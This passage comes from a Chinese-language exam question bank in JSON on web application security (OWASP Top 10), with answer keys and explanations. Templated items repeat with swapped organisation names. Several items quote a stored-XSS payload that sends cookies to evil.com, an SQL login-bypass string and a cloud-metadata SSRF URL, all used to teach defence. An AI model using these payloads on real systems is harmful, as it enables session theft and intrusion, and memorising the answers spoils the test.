    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-418",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 瀏覽器將無法關閉",
      "B. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "C. 伺服器將無法解析 Cookie",
      "D. 資料庫會被自動清空"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-419",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. SQL 注入攻擊",
      "B. 阻斷服務攻擊",
      "C. 跨網站請求偽造（CSRF）",
      "D. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-420",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 密碼過期",
      "B. 緩衝區溢位",
      "C. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "D. 網路斷線"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-421",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 僅在前端 JavaScript 阻擋單引號輸入",
      "B. 加大資料庫伺服器記憶體",
      "C. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "D. 將資料庫管理員帳號改為 root"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-422",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. 儲存型跨網站腳本（Stored XSS）",
      "B. 反射型跨網站腳本（Reflected XSS）",
      "C. DOM 型跨網站腳本（DOM-based XSS）",
      "D. SQL 注入攻擊（SQLi）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-423",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 緩衝區溢位（Buffer Overflow）",
      "B. 密碼學失效（Cryptographic Failure）",
      "C. 阻斷服務攻擊（DDoS）",
      "D. 權限控制失效（Broken Access Control / IDOR）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-424",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某公務機關資訊處委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 軟體及資料完整性失效",
      "B. 密碼學失效（Cryptographic Failures）",
      "C. 注入攻擊",
      "D. 安全性設定錯誤"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-425",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 僅依賴 HTTP Referer 檢查",
      "B. 取消所有使用者的登入功能",
      "C. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "D. 採用更長的使用者密碼"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-426",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 本地檔案包含（LFI）",
      "B. 跨網站腳本（XSS）",
      "C. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "D. 中間人攻擊（MitM）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-427",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 注入漏洞",
      "B. 軟體供應鏈弱點",
      "C. 安全性設定錯誤（Security Misconfiguration）",
      "D. 身分識別及驗證失敗"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-428",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 瀏覽器將無法關閉",
      "B. 伺服器將無法解析 Cookie",
      "C. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "D. 資料庫會被自動清空"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-429",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 跨網站請求偽造（CSRF）",
      "B. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "C. 阻斷服務攻擊",
      "D. SQL 注入攻擊"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-430",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 密碼過期",
      "B. 網路斷線",
      "C. 緩衝區溢位",
      "D. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-431",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 加大資料庫伺服器記憶體",
      "B. 僅在前端 JavaScript 阻擋單引號輸入",
      "C. 將資料庫管理員帳號改為 root",
      "D. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-432",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. SQL 注入攻擊（SQLi）",
      "B. DOM 型跨網站腳本（DOM-based XSS）",
      "C. 反射型跨網站腳本（Reflected XSS）",
      "D. 儲存型跨網站腳本（Stored XSS）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-433",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某公務機關資訊處的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 權限控制失效（Broken Access Control / IDOR）",
      "B. 密碼學失效（Cryptographic Failure）",
      "C. 緩衝區溢位（Buffer Overflow）",
      "D. 阻斷服務攻擊（DDoS）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-434",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 安全性設定錯誤",
      "B. 密碼學失效（Cryptographic Failures）",
      "C. 注入攻擊",
      "D. 軟體及資料完整性失效"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-435",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 採用更長的使用者密碼",
      "B. 取消所有使用者的登入功能",
      "C. 僅依賴 HTTP Referer 檢查",
      "D. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-436",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某高科技晶圓代工大廠的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 本地檔案包含（LFI）",
      "B. 中間人攻擊（MitM）",
      "C. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-437",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 軟體供應鏈弱點",
      "B. 身分識別及驗證失敗",
      "C. 注入漏洞",
      "D. 安全性設定錯誤（Security Misconfiguration）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-438",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "B. 伺服器將無法解析 Cookie",
      "C. 瀏覽器將無法關閉",
      "D. 資料庫會被自動清空"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-439",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 跨網站請求偽造（CSRF）",
      "B. 阻斷服務攻擊",
      "C. SQL 注入攻擊",
      "D. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-440",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 網路斷線",
      "B. 緩衝區溢位",
      "C. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "D. 密碼過期"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-441",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 加大資料庫伺服器記憶體",
      "B. 將資料庫管理員帳號改為 root",
      "C. 僅在前端 JavaScript 阻擋單引號輸入",
      "D. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-442",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. 儲存型跨網站腳本（Stored XSS）",
      "B. DOM 型跨網站腳本（DOM-based XSS）",
      "C. 反射型跨網站腳本（Reflected XSS）",
      "D. SQL 注入攻擊（SQLi）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-443",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 權限控制失效（Broken Access Control / IDOR）",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 緩衝區溢位（Buffer Overflow）",
      "D. 密碼學失效（Cryptographic Failure）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-444",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 軟體及資料完整性失效",
      "B. 安全性設定錯誤",
      "C. 密碼學失效（Cryptographic Failures）",
      "D. 注入攻擊"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-445",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 取消所有使用者的登入功能",
      "B. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "C. 僅依賴 HTTP Referer 檢查",
      "D. 採用更長的使用者密碼"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-446",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "C. 本地檔案包含（LFI）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
